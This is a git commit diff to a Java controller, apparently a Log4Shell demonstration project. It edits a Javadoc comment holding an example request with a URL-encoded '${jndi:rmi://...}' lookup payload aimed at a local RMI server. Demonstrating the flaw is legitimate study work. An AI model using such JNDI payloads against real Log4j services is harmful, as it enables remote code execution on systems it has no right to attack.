512fcc06ac408a4096e2bd2da5f9cd7a0bd192d3
zhudunfeng <2101580047@qq.com>
2021-12-16 15:56:33 +0800

    向外提供服务

--- web-rest/src/main/java/com/adun/controller/JNDIController.java
+++ web-rest/src/main/java/com/adun/controller/JNDIController.java
@@ -16,7 +16,8 @@ public class JNDIController {
     private static final Logger logger = LogManager.getLogger(JNDIController.class);
 
     /**
-     * http://127.0.0.1:8080/jndi?name=$%7Bjndi:rmi://127.0.0.1:1099/obj%7D
+     * 需要使用ASCII转义
+     * http://127.0.0.1:9999/jndi?name=$%7Bjndi:rmi://127.0.0.1:1099/obj%7D
      * @param name
      * @return
      */
